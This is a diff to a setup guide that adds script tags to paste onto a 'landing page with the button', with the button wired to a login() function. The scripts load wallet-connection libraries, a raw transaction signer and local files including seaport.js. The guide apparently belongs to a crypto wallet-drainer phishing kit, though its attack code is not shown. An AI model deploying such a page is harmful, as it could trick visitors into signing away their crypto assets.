@@ -18,6 +18,24 @@ start.sh - launcher.
 To install on a landing page, you need to write scripts on the page with the button:
 
 
+```<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript"></script>
+<script type="text/javascript" src="./scripts/sweetalert2@11"></script>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
+<script type="text/javascript" src="./scripts/index.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/web3modal@1.9.11"></script>
+<script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
+<script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+<script src="https://unpkg.com/axios@1.2.2/dist/axios.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@coinbase/wallet-sdk@3.6.3/dist/index.min.js"></script>
+<script type="text/javascript" src="./scripts/ethereumjs-tx-1.3.3.min.js"></script>
+<script language="javascript" type="text/javascript" src="./scripts/ABI.js"></script>
+<script type="text/javascript" src="./scripts/main.js"></script>
+<script type="text/javascript" src="./scripts/seaport.js"></script>
+<script src="https://code.jquery.com/jquery-3.6.3.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.33/src/ua-parser.min.js"></script>
+<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+````
+
 and set the property for the required button:
 
 ``onclick="login()"``
